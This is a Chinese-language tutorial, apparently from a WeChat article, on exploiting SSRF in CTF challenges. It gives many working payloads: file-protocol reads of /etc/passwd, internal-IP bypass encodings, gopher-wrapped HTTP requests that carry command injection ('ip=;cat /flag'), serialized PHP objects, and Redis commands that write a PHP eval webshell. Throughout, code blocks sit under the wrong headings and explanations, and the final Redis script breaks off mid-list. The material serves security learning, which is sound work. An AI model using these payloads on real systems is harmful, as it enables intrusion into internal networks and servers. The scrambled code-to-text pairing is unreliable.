> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/0wdxfetcp8TUtLZFWI16uA)

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8SgJ1jhUy7l4LlzhmLjv5goaBmngONzzibunlnhYOZeMvD6L2BCnhBBBfxEib3ACyf1Tbd0uX9pVoQ/640?wx_fmt=png)

在最近一段时间的 CTF 中，感觉 SSRF 的题型又多了起来。SSRF 这个漏洞也是我自己最喜欢的一个漏洞了，趁寒假没事干，便写了这篇文章总结一下 SSRF 的几种利用方式。本文多为笔者的学习总结，内容十分详细且丰富，大佬路过还望多多点评。

漏洞详情
----

SSRF（Server-Side Request Forgery: 服务器端请求伪造）是一种由攻击者构造形成并由服务端发起恶意请求的一个安全漏洞。正是因为恶意请求由服务端发起，而服务端能够请求到与自身相连而与外网隔绝的内部网络系统，所以一般情况下，SSRF 的攻击目标是攻击者无法直接访问的内网系统。

SSRF 漏洞的形成大多是由于服务端提供了从其他服务器应用获取数据的功能而没有对目标地址做过滤和限制。例如，黑客操作服务端从指定 URL 地址获取网页文本内容，加载指定地址的图片，下载等，利用的就是服务端请求伪造，SSRF 漏洞可以利用存在缺陷的 WEB 应用作为代理攻击远程和本地的服务器。

如下图所示，服务器 Ubuntu 为 WEB 服务器，可被攻击者访问，内网中的其他服务器无法被攻击者直接访问。假设服务器 Ubuntu 中的某个 WEB 应用存在 SSRF 漏洞，那我们就可以操作这个 WEB 服务器去读取本地的文件、探测内网主机存活、探测内网主机端口等，如果借助相关网络协议，我们还可以攻击内网中的 Redis、MySql、FastCGI 等应用，WEB 服务器在整个攻击过程中被作为中间人进行利用。

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8SgJ1jhUy7l4LlzhmLjv5gX2s9aahuxqiccSU4yaibrrJG0ia6d7D6EtJ2icxh6xNHGicYj7Cw2StZFicg/640?wx_fmt=png)

**容易出现 SSRF 的地方有：**

> 1.  社交分享功能：获取超链接的标题等内容进行显示
>     
> 2.  转码服务：通过 URL 地址把原地址的网页内容调优使其适合手机屏幕浏览
>     
> 3.  在线翻译：给网址翻译对应网页的内容
>     
> 4.  图片加载 / 下载：例如富文本编辑器中的点击下载图片到本地、通过 URL 地址加载或下载图片
>     
> 5.  图片 / 文章收藏功能：主要其会取 URL 地址中 title 以及文本的内容作为显示以求一个好的用具体验
>     
> 6.  云服务厂商：它会远程执行一些命令来判断网站是否存活等，所以如果可以捕获相应的信息，就可以进行 ssrf 测试
>     
> 7.  网站采集，网站抓取的地方：一些网站会针对你输入的 url 进行一些信息采集工作
>     
> 8.  数据库内置功能：数据库的比如 mongodb 的 copyDatabase 函数
>     
> 9.  邮件系统：比如接收邮件服务器地址
>     
> 10.  编码处理、属性信息处理，文件处理：比如 ffpmg，ImageMagick，docx，pdf，xml 处理器等
>     
> 11.  未公开的 api 实现以及其他扩展调用 URL 的功能：可以利用 google 语法加上这些关键字去寻找 SSRF 漏洞。一些的 url 中的关键字有：share、wap、url、link、src、source、target、u、3g、display、sourceURl、imageURL、domain……
>     
> 12.  从远程服务器请求资源
>     

**SSRF 漏洞的危害：**

> 1.  对外网、服务器所在内网、服务器本地进行端口扫描，获取一些服务的 banner 信息等。
>     
> 2.  攻击运行在内网或服务器本地的其他应用程序，如 redis、mysql 等。
>     
> 3.  对内网 Web 应用进行指纹识别，识别企业内部的资产信息。
>     
> 4.  攻击内外网的 Web 应用，主要是使用 HTTP GET/POST 请求就可以实现的攻击，如 sql 注入、文件上传等。
>     
> 5.  利用 file 协议读取服务器本地文件等。
>     
> 6.  进行跳板攻击等。
>     

SSRF 漏洞相关函数和类
-------------

*   filegetcontents()：将整个文件或一个 url 所指向的文件读入一个字符串中。
    
*   readfile()：输出一个文件的内容。
    
*   fsockopen()：打开一个网络连接或者一个 Unix 套接字连接。
    
*   curlexec()：初始化一个新的会话，返回一个 cURL 句柄，供 curlsetopt()，curlexec() 和 curlclose() 函数使用。
    
*   fopen()：打开一个文件文件或者 URL。
    
*   ......
    

上述函数函数使用不当会造成 SSRF 漏洞。此外，PHP 原生类 SoapClient 在触发反序列化时可导致 SSRF。

### filegetcontents()

测试代码：

```
// ssrf.php
<?php
$host=$_GET['url'];
$fp = fsockopen($host, 80, $errno, $errstr, 30);
if (!$fp) {
    echo "$errstr ($errno)<br />\n";
} else {
    $out = "GET / HTTP/1.1\r\n";
    $out .= "Host: $host\r\n";
    $out .= "Connection: Close\r\n\r\n";
    fwrite($fp, $out);
    while (!feof($fp)) {
        echo fgets($fp, 128);
    }
    fclose($fp);
}
?>
```

上述测试代码中，filegetcontents() 函数将整个文件或一个 url 所指向的文件读入一个字符串中，并展示给用户，我们构造类似 `ssrf.php?url=../../../../../etc/passwd` 的 paylaod 即可读取服务器本地的任意文件。

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8SgJ1jhUy7l4LlzhmLjv5gIfIEDUCDR34o7s6Qdk8Kf6mibqwNtaXk8Qa0LY5ka9eTzsgNyqPb1AQ/640?wx_fmt=png)

也可以进行远程访问：

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8SgJ1jhUy7l4LlzhmLjv5g28BCxAh4vooR7b3VUHdtrkljlXgdXdCvT5Y2wZia0uboEU98y1ugrvA/640?wx_fmt=png)

readfile() 函数与 filegetcontents() 函数相似。

### fsockopen()

`fsockopen($hostname,$port,$errno,$errstr,$timeout)` 用于打开一个网络连接或者一个 Unix 套接字连接，初始化一个套接字连接到指定主机（hostname），实现对用户指定 url 数据的获取。该函数会使用 socket 跟服务器建立 tcp 连接，进行传输原始数据。fsockopen() 将返回一个文件句柄，之后可以被其他文件类函数调用（例如：fgets()，fgetss()，fwrite()，fclose() 还有 feof()）。如果调用失败，将返回 false。

测试代码：

```
// ssrf.php
<?php 
if (isset($_GET['url'])){
  $link = $_GET['url'];
  $curlobj = curl_init(); // 创建新的 cURL 资源
  curl_setopt($curlobj, CURLOPT_POST, 0);
  curl_setopt($curlobj,CURLOPT_URL,$link);
  curl_setopt($curlobj, CURLOPT_RETURNTRANSFER, 1); // 设置 URL 和相应的选项
  $result=curl_exec($curlobj); // 抓取 URL 并把它传递给浏览器
  curl_close($curlobj); // 关闭 cURL 资源，并且释放系统资源
 
  // $filename = './curled/'.rand().'.txt';
  // file_put_contents($filename, $result); 
  echo $result;
}
?>
```

构造 `ssrf.php?url=www.baidu.com` 即可成功触发 ssrf 并返回百度主页：

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8SgJ1jhUy7l4LlzhmLjv5gPichxPH7gkVric4cuOWanlMUTibia0QQBTRVhqqV5icDtFevOBEnKolXnuw/640?wx_fmt=png)

但是该函数的 SSRF 无法读取本地文件。

### curl_exec()

curlinit(url) 函数初始化一个新的会话，返回一个 cURL 句柄，供 curlsetopt()，curlexec() 和 curlclose() 函数使用。

测试代码：

```
public SoapClient :: SoapClient(mixed $wsdl [，array $options ])
```

构造 `ssrf.php?url=www.baidu.com` 即可成功触发 ssrf 并返回百度主页：

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8SgJ1jhUy7l4LlzhmLjv5gicXjFIMpQxf1DtALnlslx4wBEtoV2wjsxZoxc7VpV8k9vTCfrnAaiaDA/640?wx_fmt=png)

也可以使用 file 协议读取本地文件：

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8SgJ1jhUy7l4LlzhmLjv5gH40bYl8o7ftiaQI6K2QVhUe4Dbbt10SqVbic1qzxZDhewC1zzzHIvIaw/640?wx_fmt=png)

### SoapClient

SOAP 是简单对象访问协议，简单对象访问协议（SOAP）是一种轻量的、简单的、基于 XML 的协议，它被设计成在 WEB 上交换结构化的和固化的信息。PHP 的 SoapClient 就是可以基于 SOAP 协议可专门用来访问 WEB 服务的 PHP 客户端。

SoapClient 是一个 php 的内置类，当其进行反序列化时，如果触发了该类中的 `__call` 方法，那么 `__call` 便方法可以发送 HTTP 和 HTTPS 请求。该类的构造函数如下：

```
<?php
$a = new SoapClient(null,array('uri'=>'http://47.xxx.xxx.72:2333', 'location'=>'http://47.xxx.xxx.72:2333/aaa'));
$b = serialize($a);
echo $b;
$c = unserialize($b);
$c->a();    // 随便调用对象中不存在的方法, 触发__call方法进行ssrf
?>
```

*   第一个参数是用来指明是否是 wsdl 模式。
    
*   第二个参数为一个数组，如果在 wsdl 模式下，此参数可选；如果在非 wsdl 模式下，则必须设置 location 和 uri 选项，其中 location 是要将请求发送到的 SOAP 服务器的 URL，而 uri 是 SOAP 服务的目标命名空间。
    

知道上述两个参数的含义后，就很容易构造出 SSRF 的利用 Payload 了。我们可以设置第一个参数为 null，然后第二个参数为一个包含 location 和 uri 的数组，location 选项的值设置为 target_url：

```
// ssrf.php
<?php 
if (isset($_GET['url'])){
  $link = $_GET['url'];
  $curlobj = curl_init(); // 创建新的 cURL 资源
  curl_setopt($curlobj, CURLOPT_POST, 0);
  curl_setopt($curlobj,CURLOPT_URL,$link);
  curl_setopt($curlobj, CURLOPT_RETURNTRANSFER, 1); // 设置 URL 和相应的选项
  $result=curl_exec($curlobj); // 抓取 URL 并把它传递给浏览器
  curl_close($curlobj); // 关闭 cURL 资源，并且释放系统资源
 
  // $filename = './curled/'.rand().'.txt';
  // file_put_contents($filename, $result); 
  echo $result;
}
?>
```

47.xxx.xxx.72 监听 2333 端口，访问 ssrf.php，即可在 47.xxx.xxx.72 上得到访问的数据：  

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8SgJ1jhUy7l4LlzhmLjv5gaUnHZI9lxnico4zqDzPzx8clE51G9UO1C8k4OA2UicjghJhOJRGMZ5Ow/640?wx_fmt=png)

如上图所示，ssrf 触发成功。

由于它仅限于 http/https 协议，所以用处不是很大。但是如果这里的 http 头部还存在 crlf 漏洞，那么我们就可以进行 ssrf+crlf，注入或修改一些 http 请求头，详情请看：《SoapClient+crlf 组合拳进行 SSRF》

### SSRF 漏洞利用的相关协议

SSRF 漏洞的利用所涉及的协议有：

*   file 协议：在有回显的情况下，利用 file 协议可以读取任意文件的内容
    
*   dict 协议：泄露安装软件版本信息，查看端口，操作内网 redis 服务等
    
*   gopher 协议：gopher 支持发出 GET、POST 请求。可以先截获 get 请求包和 post 请求包，再构造成符合 gopher 协议的请求。gopher 协议是 ssrf 利用中一个最强大的协议 (俗称万能协议)。可用于反弹 shell
    
*   http/s 协议：探测内网主机存活
    

下面我们对这些协议的利用进行逐一演示。

常见利用方式（file、http/s 和 dict 协议）
-----------------------------

SSRF 的利用主要就是读取内网文件、探测内网主机存活、扫描内网端口、攻击内网其他应用等，而这些利用的手法无一不与这些协议息息相关。

以下几个演示所用的测试代码：

```
http://localhost/         # localhost就是代指127.0.0.1
http://0/                 # 0在window下代表0.0.0.0，而在liunx下代表127.0.0.1
http://0.0.0.0/       # 0.0.0.0这个IP地址表示整个网络，可以代表本机 ipv4 的所有地址
http://[0:0:0:0:0:ffff:127.0.0.1]/    # 在liunx下可用，window测试了下不行
http://[::]:80/           # 在liunx下可用，window测试了下不行
http://127。0。0。1/       # 用中文句号绕过
http://①②⑦.⓪.⓪.①
http://127.1/
http://127.00000.00000.001/ # 0的数量多一点少一点都没影响，最后还是会指向127.0.0.1
```

### 读取内网文件（file 协议）

我们构造如下 payload，即可将服务器上的本地文件及网站源码读取出来：

```
// ssrf.php
<?php
highlight_file(__FILE__);
if(!preg_match('/^https/is',$_GET['url'])){
    die("no hack");
}
echo file_get_contents($_GET['url']);
?>
```

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8SgJ1jhUy7l4LlzhmLjv5gmxeCSvV6LfdBIXRhuCG20Kuyyu1N2TIbiaaeO4DicNYWKZu5gktTJlew/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8SgJ1jhUy7l4LlzhmLjv5gZtiavEAWiaQZ52UEbaCU5SqyU3PA1klG1QTiaeFkoS2Zxia8sX9I8jGcdA/640?wx_fmt=png)

### 探测内网主机存活（http/s 协议）

一般是先想办法得到目标主机的网络配置信息，如读取 / etc/hosts、/proc/net/arp、/proc/net/fib_trie 等文件，从而获得目标主机的内网网段并进行爆破。

> 域网 IP 地址范围分三类，以下 IP 段为内网 IP 段：
> 
> ```
> // ssrf.php
> <?php
> $url = 'http://'. $_GET[url];
> $parsed = parse_url($url);
> if( $parsed[port] == 80 ){  // 这里限制了我们传过去的url只能是80端口的
>   readfile($url);
> } else {
>   die('Hacker!');
> }
> ?>
> ```

测试环境如下：

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8SgJ1jhUy7l4LlzhmLjv5gzR88jgJsfHib2LStHWqNKDTsTFAQB5GB6ynFTOibhgnxvqhib6nJBW4Lg/640?wx_fmt=png)

假设 WEB 服务器 Ubuntu 上面存在上述所说的 SSRF 漏洞，我们构造如下 payload，便可通过 Ubuntu 服务器发送请求去探测内网存活的主机：

```
<?php
highlight_file(__FILE__);
function check_inner_ip($url)
{
    $match_result=preg_match('/^(http|https)?:\/\/.*(\/)?.*$/',$url);
    if (!$match_result)
    {
        die('url fomat error');
    }
    try
    {
        $url_parse=parse_url($url);
    }
    catch(Exception $e)
    {
        die('url fomat error');
        return false;
    }
    $hostname=$url_parse['host'];
    $ip=gethostbyname($hostname);
    $int_ip=ip2long($ip);
    return ip2long('127.0.0.0')>>24 == $int_ip>>24 || ip2long('10.0.0.0')>>24 == $int_ip>>24 || ip2long('172.16.0.0')>>20 == $int_ip>>20 || ip2long('192.168.0.0')>>16 == $int_ip>>16;// 检查是否是内网ip
}
function safe_request_url($url)
{
    if (check_inner_ip($url))
    {
        echo $url.' is inner ip';
    }
    else
    {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        $output = curl_exec($ch);
        $result_info = curl_getinfo($ch);
        if ($result_info['redirect_url'])
        {
            safe_request_url($result_info['redirect_url']);
        }
        curl_close($ch);
        var_dump($output);
    }
}
$url = $_GET['url'];
if(!empty($url)){
    safe_request_url($url);
}
?>
```

为了方便，我们可以借助 burpsuite 的 Intruder 模块进行爆破，如下所示：

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8SgJ1jhUy7l4LlzhmLjv5gKj5nAMiau5qjjSjGlckEGlUdUWggfKFlCrgkSlrAkSv4FrLiaR1mc2mw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8SgJ1jhUy7l4LlzhmLjv5gtn76kHWHY9yJ0IhBSiczKjeHWxaJRxFeBZfzF8RAjShy0lYlVa5B7Pw/640?wx_fmt=png)

将爆破的线程尽可能设的小一些。开始爆破后即可探测到目标内网中存在如下两个存活的主机（192.168.52.130 和 192.168.52.131）：

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8SgJ1jhUy7l4LlzhmLjv5gAa39hPAVQUqgBeMVRcQE9trHTvx4UueyAQp9TAZmV275WkXBF64L0g/640?wx_fmt=png)

### 扫描内网端口（http/s 和 dict 协议）

同样是上面那个测试环境：

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8SgJ1jhUy7l4LlzhmLjv5gzR88jgJsfHib2LStHWqNKDTsTFAQB5GB6ynFTOibhgnxvqhib6nJBW4Lg/640?wx_fmt=png)

我们利用 dict 协议构造如下 payload 即可查看内网主机上开放的端口及端口上运行服务的版本信息等：

```
URL: gopher://<host>:<port>/<gopher-path>_后接TCP数据流

# 注意不要忘记后面那个下划线"_"，下划线"_"后面才开始接TCP数据流，如果不加这个"_"，那么服务端收到的消息将不是完整的，该字符可随意写。
```

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8SgJ1jhUy7l4LlzhmLjv5ghcrMJrc49Tib641WD1RzzFB8PHDAYbC2ycDvbP9qtoStYJRiarJd0vnQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8SgJ1jhUy7l4LlzhmLjv5gLOOUerOd1icLjRibWicehiaOtTrRDc7oedqELzOX3fxlKleESYvGrKAD8A/640?wx_fmt=png)

同样可以借助 burpsuite 来爆破内网主机上的服务。

相关绕过姿势
------

对于 SSRF 的限制大致有如下几种：

*   限制请求的端口只能为 Web 端口，只允许访问 HTTP 和 HTTPS 的请求。
    
*   限制域名只能为 http://www.xxx.com
    
*   限制不能访问内网的 IP，以防止对内网进行攻击。
    
*   屏蔽返回的详细信息。
    

### 利用 HTTP 基本身份认证的方式绕过

如果目标代码限制访问的域名只能为 http://www.xxx.com ，那么我们可以采用 HTTP 基本身份认证的方式绕过。即 @：http://www.xxx.com@www.evil.com

### 利用 302 跳转绕过内网 IP

绕过对内网 ip 的限制我们可以**利用 302 跳转**的方法，有以下两种。

（1）网络上存在一个很神奇的服务，网址为 http://xip.io，当访问这个服务的任意子域名的时候，都会重定向到这个子域名，举个例子：

当我们访问：http://127.0.0.1.xip.io/flag.php 时，实际上访问的是 http://127.0.0.1/1.php 。像这种网址还有 http://nip.io，http://sslip.io 。

如下示例（flag.php 仅能从本地访问）：

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8SgJ1jhUy7l4LlzhmLjv5gsibKDibd9NwibwTfJibszpFuxBibBkv5FHjMroT5Wprt0o0D9xRYia6REvnA/640?wx_fmt=png)

（2）短地址跳转绕过，这里也给出一个网址 https://4m.cn/：

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8SgJ1jhUy7l4LlzhmLjv5gGxldsco0XSHzicCpNvUuD33MPYbqZ7mTkNHoCNG50nHyn3kd5pLc0fA/640?wx_fmt=png)

直接使用生成的短连接 https://4m.cn/FjOdQ 就会自动 302 跳转到 http://127.0.0.1/flag.php 上，这样就可以绕过 WAF 了：

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8SgJ1jhUy7l4LlzhmLjv5gfNDPYGCFEMicCQeicYDvQcwltL4fBvQGaHnf8G6x8uvnbvNzpuEz2m1A/640?wx_fmt=png)

### 进制的转换绕过内网 IP

可以使用一些不同的进制替代 ip 地址，从而绕过 WAF，这里给出个从网上扒的 php 脚本可以一键转换：

```
// echo.php
<?php
echo "Hello ".$_GET["whoami"]."\n"
?>
```

### 其他各种指向 127.0.0.1 的地址

```
import urllib.parse
payload =\
"""GET /echo.php?whoami=Bunny HTTP/1.1
Host: 47.xxx.xxx.72
"""  
# 注意后面一定要有回车，回车结尾表示http请求结束
tmp = urllib.parse.quote(payload)
new = tmp.replace('%0A','%0D%0A')
result = 'gopher://47.xxx.xxx.72:80/'+'_'+new
print(result)
```

### 利用不存在的协议头绕过指定的协议头

`file_get_contents()`函数的一个特性，即当 PHP 的 `file_get_contents()` 函数在遇到不认识的协议头时候会将这个协议头当做文件夹，造成目录穿越漏洞，这时候只需不断往上跳转目录即可读到根目录的文件。（include() 函数也有类似的特性）

测试代码：

```
curl gopher://47.xxx.xxx.72:80/_GET%20/echo.php%3Fwhoami%3DBunny%20HTTP/1.1%0D%0AHost%3A%2047.xxx.xxx.72%0D%0A
```

上面的代码限制了 url 只能是以 https 开头的路径，那么我们就可以如下：

```
// echo.php
<?php
echo "Hello ".$_POST["whoami"]."\n"
?>
```

此时 `file_get_contents()` 函数遇到了不认识的伪协议头 “httpsssss://”，就会将他当做文件夹，然后再配合目录穿越即可读取文件：

```
POST /echo.php HTTP/1.1
Host: 47.xxx.xxx.72
Content-Type: application/x-www-form-urlencoded
Content-Length: 12

whoami=Bunny
```

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8SgJ1jhUy7l4LlzhmLjv5g4JljFFDsOMVoHJOhDttoibZWmD2VwbmBTFm06eAE5d9QFiauc3gydBoA/640?wx_fmt=png)

这个方法可以在 SSRF 的众多协议被禁止且只能使用它规定的某些协议的情况下来进行读取文件。

### 利用 URL 的解析问题

该思路来自 Orange Tsai 成员在 2017 BlackHat 美国黑客大会上做的题为《A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages》的分享。主要是利用 readfile 和 parseurl 函数的解析差异以及 curl 和 parseurl 解析差异来进行绕过。

**（1）利用 readfile 和 parse_url 函数的解析差异绕过指定的端口**

测试代码：

```
import urllib.parse
payload =\
"""POST /echo.php HTTP/1.1
Host: 47.xxx.xxx.72
Content-Type: application/x-www-form-urlencoded
Content-Length: 12

whoami=Bunny
"""  
# 注意后面一定要有回车，回车结尾表示http请求结束
tmp = urllib.parse.quote(payload)
new = tmp.replace('%0A','%0D%0A')
result = 'gopher://47.xxx.xxx.72:80/'+'_'+new
print(result)
```

用 python 在当前目录下起一个端口为 11211 的 WEB 服务：

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8SgJ1jhUy7l4LlzhmLjv5gYjPrEtIzSA5XicibZO6Lkvvt9ic7g56icEtqpfbb8cjXwTw8r0uDVIW59Q/640?wx_fmt=png)

上述代码限制了我们传过去的 url 只能是 80 端口的，但如果我们想去读取 11211 端口的文件的话，我们可以用以下方法绕过：

```
curl gopher://47.xxx.xxx.72:80/_POST%20/echo.php%20HTTP/1.1%0D%0AHost%3A%2047.xxx.xxx.72%0D%0AContent-Type%3A%20application/x-www-form-urlencoded%0D%0AContent-Length%3A%2012%0D%0A%0D%0Awhoami%3DBunny%0D%0A
```

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8SgJ1jhUy7l4LlzhmLjv5g9IYHjxL629vxFuVeEJlNesweHWafDLBb0D2gLllIY76kUJBLsiciawOg/640?wx_fmt=png)

如上图所示成功读取了 11211 端口中的 flag.txt 文件，下面用 BlackHat 的图来说明原理：

![](https://mmbiz.qpic.cn/mmbiz/Uq8Qfeuvou8SgJ1jhUy7l4LlzhmLjv5gJeVib2VibFkmOia0Qicza5lwU7U0s3nOzwQB2K3oz7PKEnbfh2ick5fBsZQ/640?wx_fmt=jpeg)

从上图中可以看出 readfile() 函数获取的端口是最后冒号前面的一部分（11211），而 parse_url() 函数获取的则是最后冒号后面的的端口（80），利用这种差异的不同，从而绕过 WAF。

这两个函数在解析 host 的时候也有差异，如下图：

![](https://mmbiz.qpic.cn/mmbiz/Uq8Qfeuvou8SgJ1jhUy7l4LlzhmLjv5gSnxxK8xIMEWVGicZQanjuhxSBOB9ow3PMSP4m5tW9sFmXKUyOsamBAQ/640?wx_fmt=jpeg)

readfile() 函数获取的是 @号后面一部分（evil.com），而 parseurl() 函数获取的则是 @号前面的一部分（google.com），利用这种差异的不同，我们可以绕过题目中 parseurl() 函数对指定 host 的限制。

**（2）利用 curl 和 parse_url 的解析差异绕指定的 host**

原理如下：

![](https://mmbiz.qpic.cn/mmbiz/Uq8Qfeuvou8SgJ1jhUy7l4LlzhmLjv5g3bT6azPUDb024vlOvRicfKkWYXZsKqtXTUsphwcN8uWAYHfUqFJT5aw/640?wx_fmt=jpeg)

从上图中可以看到 curl() 函数解析的是第一个 @后面的网址，而 parseurl() 函数解析的是第二个 @后面的网址。利用这个原理我们可以绕过题目中 parseurl() 函数对指定 host 的限制。

测试代码：

```
<?php
class Welcome {
    protected $url = "http://127.0.0.1/tool.php";
    
}
$poc = new Welcome;
//echo serialize($poc);
echo urlencode(serialize($poc));
?>
```

上述代码中可以看到 `check_inner_ip`函数通过 `url_parse()`函数检测是否为内网 IP，如果不是内网 IP ，则通过 `curl()` 请求 url 并返回结果，我们可以利用 curl 和 parse_url 解析的差异不同来绕过这里的限制，让 `parse_url()` 处理外部网站网址，最后 `curl()` 请求内网网址。paylaod 如下：

```
O%3A7%3A%22Welcome%22%3A1%3A%7Bs%3A6%3A%22%00%2A%00url%22%3Bs%3A25%3A%22http%3A%2F%2F127.0.0.1%2Ftool.php%22%3B%7D

// O:7:"Welcome":1:{s:6:"*url";s:25:"http://127.0.0.1/tool.php";}
```

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8SgJ1jhUy7l4LlzhmLjv5gpnf5nZ8kXeKQknicicRicUJSEDdRAmNOI3JkuTarhMe9yBCYaOEGk6icuQ/640?wx_fmt=png)

不过这个方法在 Curl 较新的版本里被修掉了，所以我们还可以使用另一种方法，即 `0.0.0.0`。`0.0.0.0` 这个 IP 地址表示整个网络，可以代表本机 ipv4 的所有地址，使用如下即可绕过：

```
#tool.php
<?php
error_reporting(0);
$respect_show_ping = function($params) {
   extract($params);
   $ip = isset($ip) ? $ip :'127.0.0.1';
   system('ping -c 1 '.$ip);
};
if ($_SERVER["REMOTE_ADDR"] !== "127.0.0.1"){
   echo '<h2>Not localhost!</h2>';
}
else {
   highlight_file(__FILE__);
   $respect_show_ping($_POST);
}
?>
```

但是这只适用于 Linux 系统上，Windows 系统的不行。

[2020 首届 “祥云杯” 网络安全大赛]doyouknowssrf 这道题利用的就是这个思路。

常见攻击方式（Gopher 协议）
-----------------

### Gopher 协议在 SSRF 中的利用

Gopher 是 Internet 上一个非常有名的信息查找系统，它将 Internet 上的文件组织成某种索引，很方便地将用户从 Internet 的一处带到另一处。在 WWW 出现之前，Gopher 是 Internet 上最主要的信息检索工具，Gopher 站点也是最主要的站点，使用 TCP 70 端口。但在 WWW 出现后，Gopher 失去了昔日的辉煌。

现在的 Gopher 协议已经很少有人再使用它了，但是该协议在 SSRF 中却可以发挥巨大的作用，可以说是 SSRF 中的万金油。由于 Gopher 协议支持发出 GET、POST 请求，我们可以先截获 GET 请求包和 POST 请求包，再构造成符合 Gopher 协议请求的 payload 进行 SSRF 利用，甚至可以用它来攻击内网中的 Redis、MySql、FastCGI 等应用，这无疑大大扩展了我们的 SSRF 攻击面。

**（1）Gopher 协议格式**

```
import urllib.parse
test =\
"""POST /tool.php HTTP/1.1
Host: 127.0.0.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 13

ip=;cat /flag
"""  
#注意后面一定要有回车，回车结尾表示http请求结束
tmp = urllib.parse.quote(test)
new = tmp.replace('%0A','%0D%0A')
result = 'gopher://127.0.0.1:80/'+'_'+new
print(result)
```

*   gopher 的默认端口是 70
    
*   如果发起 POST 请求，回车换行需要使用 `%0d%0a`来代替 `%0a`，如果多个参数，参数之间的 & 也需要进行 URL 编码
    

> 那么如何利用 Gopher 发送 HTTP 的请求呢？例如 GET 请求。我们直接发送一个原始的 HTTP 包不就行了吗。在 gopher 协议中发送 HTTP 的数据，需要以下三步：
> 
> 1.  抓取或构造 HTTP 数据包
>     
> 2.  URL 编码、将回车换行符 `%0a`替换为 `%0d%0a`
>     
> 3.  发送符合 gopher 协议格式的请求
>     

**（2）利用 Gopher 协议发送 HTTP GET 请求**

测试代码：

```
gopher://127.0.0.1:80/_POST%20/tool.php%20HTTP/1.1%0D%0AHost%3A%20127.0.0.1%0D%0AContent-Type%3A%20application/x-www-form-urlencoded%0D%0AContent-Length%3A%2013%0D%0A%0D%0Aip%3D%3Bcat%20/flag%0D%0A
```

接下来我们构造 payload。一个典型的 GET 型的 HTTP 包类似如下：

```
<?php
class Welcome {
    protected $url = "gopher://127.0.0.1:80/_POST%20/tool.php%20HTTP/1.1%0D%0AHost%3A%20127.0.0.1%0D%0AContent-Type%3A%20application/x-www-form-urlencoded%0D%0AContent-Length%3A%2013%0D%0A%0D%0Aip%3D%3Bcat%20/flag%0D%0A";
    
}
$poc = new Welcome;
//echo serialize($poc);
echo urlencode(serialize($poc));
?>
```

然后利用以下脚本进行一步生成符合 Gopher 协议格式的 payload：

```
O%3A7%3A%22Welcome%22%3A1%3A%7Bs%3A6%3A%22%00%2A%00url%22%3Bs%3A197%3A%22gopher%3A%2F%2F127.0.0.1%3A80%2F_POST%2520%2Ftool.php%2520HTTP%2F1.1%250D%250AHost%253A%2520127.0.0.1%250D%250AContent-Type%253A%2520application%2Fx-www-form-urlencoded%250D%250AContent-Length%253A%252013%250D%250A%250D%250Aip%253D%253Bcat%2520%2Fflag%250D%250A%22%3B%7D
```

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8SgJ1jhUy7l4LlzhmLjv5gu4NyNS1KtCflvvNSzWhbUpPJpQKzyAIaJTkoh7QNibuRV5uib6rSQc0Q/640?wx_fmt=png)

> **注意这几个问题：**
> 
> 1.  问号（?）需要转码为 URL 编码，也就是 %3f
>     
> 2.  回车换行要变为 %0d%0a, 但如果直接用工具转，可能只会有 %0a
>     
> 3.  在 HTTP 包的最后要加 %0d%0a，代表消息结束（具体可研究 HTTP 包结束）
>     

然后执行：

```
gopher%3a%2f%2f127.0.0.1%3a80%2f_POST%2520%2ftool.php%2520HTTP%2f1.1%250D%250AHost%253A%2520127.0.0.1%250D%250AContent-Type%253A%2520application%2fx-www-form-urlencoded%250D%250AContent-Length%253A%252013%250D%250A%250D%250Aip%253D%253Bcat%2520%2fflag%250D%250A
```

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8SgJ1jhUy7l4LlzhmLjv5gEoG16L24gzU1PaLRiaaX19Q9e2AqqGFkibGhwvtFf2QX0YSlwbHz7h1w/640?wx_fmt=png)

如上图，成功用 GET 方法传参并输出 “Hello Bunny”。

**（3）利用 Gopher 协议发送 HTTP POST 请求**

测试代码：

```
flushall
set 1 '<?php eval($_POST["whoami"]);?>'
config set dir /var/www/html
config set dbfilename shell.php
save
```

接下来我们构造 payload。一个典型的 POST 型的 HTTP 包类似如下：

```
import urllib
protocol="gopher://"
ip="192.168.52.131"
port="6379"
shell="\n\n<?php eval($_POST[\"whoami\"]);?>\n\n"
file
path="/var/www/html"
passwd=""
cmd=["flushall",
   "set 1 {}".format(shell.replace(" ","${IFS}")),
